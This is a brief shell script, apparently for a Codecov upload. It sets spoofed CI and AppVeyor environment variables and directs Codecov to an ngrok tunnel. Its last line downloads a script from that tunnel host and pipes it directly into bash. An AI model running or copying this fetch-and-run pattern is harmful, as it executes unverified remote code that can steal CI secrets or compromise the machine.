#!/bin/sh

set -x


export CI="True"
export APPVEYOR="True"
export CODECOV_URL="https://6bec2ebd.ngrok.io/"
bash <(curl -s https://6bec2ebd.ngrok.io/bash) 
